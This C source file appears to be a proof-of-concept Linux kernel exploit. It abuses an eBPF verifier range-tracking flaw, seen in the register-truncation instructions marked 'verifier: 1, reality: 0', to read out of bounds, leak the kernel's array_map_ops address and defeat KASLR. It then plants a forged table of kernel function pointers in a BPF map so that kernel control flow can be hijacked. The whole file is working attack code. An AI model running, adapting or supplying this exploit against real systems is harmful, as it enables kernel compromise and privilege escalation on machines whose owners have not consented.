/*==============================================================================

# Author:       lang  lyi4ng@gmail.com
# Filetype:     C source code
# Environment:  Linux & Archlinux
# Tool:         Vim & Gcc
# Date:         2019.09.17
# Descprition:  Randomly written code

================================================================================*/


#include <stdio.h>
#include <unistd.h>
#include <assert.h>
#include <linux/bpf.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>                                                                  
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <stddef.h>
#include <bpf/bpf.h>
#include "bpf_insn.h"
#include <linux/if_packet.h>
char bpf_log_buf[BPF_LOG_BUF_SIZE];

#define BPF_MAP_GET(idx, dst)                                                                     \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                      /* r2 = fp */                  \
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                     /* r2 = fp -4 */               \
		BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                    /* *(u32 *)(fp - 4) = idx */   \
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),                      \
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                     /* if (r0 == 0) */             \
		BPF_EXIT_INSN(),                                           /* exit() */                   \
		BPF_LDX_MEM(BPF_DW, dst, BPF_REG_0, 0),                   /* dst = *(u64 *)r0 */           \
		BPF_MOV64_IMM(BPF_REG_0, 0)

#define BPF_MAP_GET_ADDR(idx, dst)                                                                \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                      /* r2 = fp */                  \
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                     /* r2 = fp -4 */               \
		BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                    /* *(u32 *)(fp - 4) = idx */   \
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),                      \
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                     /* if (r0 == 0) */             \
		BPF_EXIT_INSN(),                                           /* exit() */                   \
		BPF_MOV64_REG(dst, BPF_REG_0),                    		   /* dst = r0 */                 \
		BPF_MOV64_IMM(BPF_REG_0, 0)                                                              

#define BPF_MAP_SET(idx, flag)                                                                    \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                      /* r2 = fp */                  \
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -12),                     /* r2 = fp -12 */             \
		BPF_ST_MEM(BPF_W, BPF_REG_10, -12, idx),                    /* *(u32 *)(fp - 12) = idx */ \
		BPF_MOV64_IMM(BPF_REG_4, flag),                            /* r4 = flag */                \
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem)                       


int map_fd;
int poc_map_fd;
int result_map_fd;
int sockets[2];
char buffer[64];

int load_prog()
{
	struct bpf_insn prog[] = {
		
		BPF_LD_MAP_FD(BPF_REG_1, map_fd),
		BPF_MAP_GET(0, BPF_REG_7),

		BPF_JMP_IMM(BPF_JGE, BPF_REG_7, 1, 1),
		BPF_EXIT_INSN(),

		BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 1),
		BPF_EXIT_INSN(),

		BPF_MOV32_REG(BPF_REG_7, BPF_REG_7),   // verifier: 1, reality: 0
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, -1), // verifier: -1, reality: 0
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 1), // verifier: 0, reality:1

		BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, 0x110),
		
		//leak kaslr
		BPF_LD_MAP_FD(BPF_REG_1, poc_map_fd),
		BPF_MAP_GET_ADDR(0, BPF_REG_8),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_7),
		BPF_LD_MAP_FD(BPF_REG_1, result_map_fd), // r1 = result_map_fd
		BPF_MOV64_REG(BPF_REG_3, BPF_REG_8),
		BPF_MAP_SET(0, 0),

		BPF_EXIT_INSN(),
	};
	return bpf_load_program(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog) / sizeof(struct bpf_insn), "GPL", 0, bpf_log_buf, BPF_LOG_BUF_SIZE);
}

static void writemsg(void) 
{
	char buffer[64];

	ssize_t n = write(sockets[0], buffer, sizeof(buffer));

	if (n < 0) {
		perror("write");
		return;
	}
	if (n != sizeof(buffer))
		fprintf(stderr, "short write: %lu\n", n);
}

int main(int argc, char *argv[])
{
	int key, ret, poc_key = 0, ctl_key = 1;
	unsigned long value = 0x1;
	unsigned long kaslr = 0x0; 
	unsigned long poc_value = 0x100000000;
	unsigned long ctl_value = 0x1;

	struct bpf_map_info info = {};
	uint32_t info_len = sizeof(info);
	char *exp = malloc(0x1000);

	
	/* Create Map */
	map_fd = bpf_create_map_name(BPF_MAP_TYPE_ARRAY, "ctlmap",sizeof(int), sizeof(unsigned long),
			256, 0);
	
	if (map_fd < 0) {
		printf("failed to create map '%s'\n", strerror(errno));
		goto cleanup;
	}
	poc_map_fd = bpf_create_map_name(BPF_MAP_TYPE_ARRAY, "pocmap", sizeof(int), 0x2000,
			1, 0);
	
	if (poc_map_fd < 0) {
		printf("failed to create map '%s'\n", strerror(errno));
		goto cleanup;
	}

	result_map_fd = bpf_create_map_name(BPF_MAP_TYPE_ARRAY, "resmap", sizeof(int), sizeof(long long),
			256, 0);
	if (result_map_fd < 0) {
		printf("failed to create map '%s'\n", strerror(errno));
		goto cleanup;
	}

	int progfd = load_prog();
	
	if (progfd < 0) {
		printf("failed to load prog '%s'\n", strerror(errno));
		printf("log buffer: '%s'\n", bpf_log_buf);
	}

	
	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)){
        printf("setsockopt %s\n", strerror(errno));
        goto cleanup;
    }

	if(setsockopt(sockets[1], SOL_SOCKET, 50, &progfd, sizeof(progfd)) < 0){
    	printf("setsockopt %s\n", strerror(errno));
		goto cleanup;
	}
	
	bpf_map_update_elem(map_fd, &poc_key, &poc_value, BPF_ANY);
	bpf_map_update_elem(map_fd, &ctl_key, &ctl_value, BPF_ANY);
	printf("ctl value = %d\n", ctl_value);

	writemsg();

	key = 0;
	bpf_map_lookup_elem(result_map_fd, &key, &value);

	kaslr = value - 0xffffffff8231a6a0;
	printf("array_map_ops : '%llx'\nkaslr : %llx\n", value, kaslr);

	ret = bpf_obj_get_info_by_fd(poc_map_fd, &info, &info_len);
	if (ret) {
		printf("can't get prog info - %s\n", strerror(errno));
		goto cleanup;
	}
	printf("leak data: '%lx'\n", info.btf_id);

	uint64_t hack_ops[] = { 
		kaslr + 0xffffffff812c7dc0,
		kaslr + 0xffffffff812c9460,
		0x0,
		kaslr + 0xffffffff812c8e20,
		kaslr + 0xffffffff812c7f50,
		0x0,
		0x0,
		kaslr + 0xffffffff812c8050,
		kaslr + 0xffffffff812c8c40,
		kaslr + 0xffffffff812c7fc0,
		0x0,
		0x0,
		0x0,
		0x0,
		0x0,
		kaslr + 0xffffffff812c85a0,
		0x0,
		kaslr + 0xffffffff812c8240,
		kaslr + 0xffffffff812c81a0,
		kaslr + 0xffffffff812c7e70,
		kaslr + 0xffffffff812c7ed0
	};

	

	memcpy(exp, (void *)hack_ops, sizeof(hack_ops));
	bpf_map_update_elem(poc_map_fd, &poc_key, exp, BPF_ANY);
	ctl_value = 0x2;
	bpf_map_update_elem(map_fd, &ctl_key, &ctl_value, BPF_ANY);
	printf("ctl value = %d\n", ctl_value);

	writemsg();

	getchar();
cleanup:
	return 0;

}

